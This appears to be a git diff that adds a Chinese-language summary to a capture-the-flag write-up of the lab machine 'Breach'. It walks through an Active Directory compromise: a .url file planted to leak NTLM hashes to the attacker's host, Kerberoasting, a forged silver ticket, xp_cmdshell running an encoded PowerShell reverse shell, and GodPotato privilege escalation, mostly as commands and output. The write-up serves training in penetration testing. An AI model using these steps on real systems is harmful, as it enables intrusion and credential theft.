@@ -1,4 +1,84 @@
 ## Breach
+### 总结
+```
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+OS Version:                10.0.20348 N/A Build 20348		//Windows Server 2022 (Build 20348)
+
+[★]$ nxc smb breach.vl -u guest -p '' --shares
+[★]$ smbclient //10.129.3.36/share
+smb: \> ls transfer\
+  .                                   D        0  Mon Sep  8 05:13:44 2025
+  ..                                  D        0  Sun Mar  8 09:23:43 2026
+  claire.pope                         D        0  Thu Feb 17 05:21:35 2022
+  diana.pope                          D        0  Thu Feb 17 05:21:19 2022
+  julia.wong                          D        0  Wed Apr 16 19:38:12 2025
+
+//.url 快捷方式配置格式，Internet Shortcut (.url)，Windows Internet Shortcut 文件（Windows 互联网快捷方式文件）
+[★]$ cat kavi.url
+[InternetShortcut] 					//[InternetShortcut]表示这是一个 Windows Internet Shortcut 配置文件，类似浏览器快捷方式
+URL=asdasdas
+WorkingDirectory=hehe 				//工作目录
+IconFile=\\10.10.14.27\aasd\nc.ico 	//nc.ico 只是一个 图标文件名
+IconIndex=1 						//指定图标文件中的第几个图标,格式完整
+
+[★]$ sudo responder -I tun0
+//发现用户，在用户的地方上传 kavi.url,本地侦听，得到NTLMv2 challenge-response hash。
+————————————————————————
+[★]$ bloodhound-python -d breach.vl -u 'julia.wong' -p 'Computer1' -dc 'BREACHDC.breach.vl'  -c all -ns 10.129.3.36 --dns-tcp
+Kerberoastable Account 中文意思：可以进行 Kerberoasting 攻击的账户
+[1]使用 Impacket 工具包中的 GetUserSPNs.py 脚本来执行 Kerberoasting 攻击，以获取此用户的 KRB5TGS 哈希值（Kerberos 第五版服务票据哈希）
+[★]$ GetUserSPNs.py 'breach.vl/julia.wong:Computer1' -request 
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
+--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2026-03-08 09:15:47.746899             
+///得到VPN和svc_mssql_hash
+[2]从 Bloodhound 中获取。在搜索栏中搜索“breach.vl”，然后导航至Node Info -> Object ID
+以管理员用户身份进行身份冒充以访问 MSSQL 服务器,1433 上运行的 MSSQLSvc 服务
+[3]生成svc_mssql 账户的 rc4 哈希值
+[★]$ pypykatz crypto nt Trustno1
+[4]使用 Impacket 中的 ticketer.py 脚本来创建一张银色门票，并以管理员用户的身份进行模拟
+[★]$ ticketer.py -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -dc-ip 10.129.3.36 -domain breach.vl -user-id 500 Administrator
+[*] Saving ticket in Administrator.ccache
+[5]将创建的“Administrator.ccache”文件导出，并使用 Impacket 中的“mssqlclient.py”脚本对 MSSQL 服务器进行身份验证。
+[★]$ export KRB5CCNAME=Administrator.ccache
+[★]$ mssqlclient.py -k -no-pass -windows-auth breachdc.breach.vl
+SQL (BREACH\Administrator  dbo@master)> 
+
+另外刷新 Kerberos，[★]$ kdestroy
+————————————————————————
+启用 xp_cmdshell 功能并在目标系统内执行命令。
+
+SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'show advanced options', 1; //开启 SQL Server 高级配置选项，1启用
+
+SQL (BREACH\Administrator  dbo@master)> RECONFIGURE; //立即生效
+SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; //从 SQL Server 直接执行 Windows 命令行命令，1启用
+
+SQL (BREACH\Administrator  dbo@master)> RECONFIGURE; //立即生效
+SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'whoami'; //调用 Windows shell，执行系统命令
+
+SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'powershell -exec bypass -enc <Base64Payload>'; //启动 PowerShell，-exec bypass绕过执行策略，-enc：Base64 编码命令
+工具 revshells.com; 选择PowerShell #3(Base64);Base64 编码的 UTF-16LE PowerShell 脚本
+————————————————————————
+PS C:\Windows\system32> whoami /priv
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled  //可以冒充已经连接的客户端身份
+[6]使用“GodPotato”来提升权限并获取以“nt”权限或“系统”身份的反弹shell，https://github.com/BeichenDream/GodPotato
+//当前 shell 拥有 SeImpersonatePrivilege，而 GodPotato 可以利用这个权限直接伪装成 SYSTEM token，从而提权到 NT AUTHORITY\SYSTEM
+PS C:\Windows\tasks> .\GodPotato-NET4.exe -cmd 'powershell -exec bypass -enc <Base64Payload>' 
+低权限进程
+↓
+诱骗 SYSTEM 服务进行 RPC 认证
+↓
+获取 SYSTEM token
+↓
+利用 SeImpersonatePrivilege
+↓
+伪装为 SYSTEM
+↓
+启动 SYSTEM shell
+
+```
 ```
 [★]$ nmap -sC -sV 10.129.3.36
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-08 09:18 CDT
@@ -145,7 +225,7 @@ smb: \transfer\> put kavi.url
 putting file kavi.url as \transfer\kavi.url (1.9 kb/s) (average 2.8 kb/s)
 smb: \transfer\> 
 ```
-#### 等着等着就有了
+#### 等着等着就有了，NTLM 捕获攻击，NTLMv2 challenge-response hash
 ```
 [+] Listening for events...
 
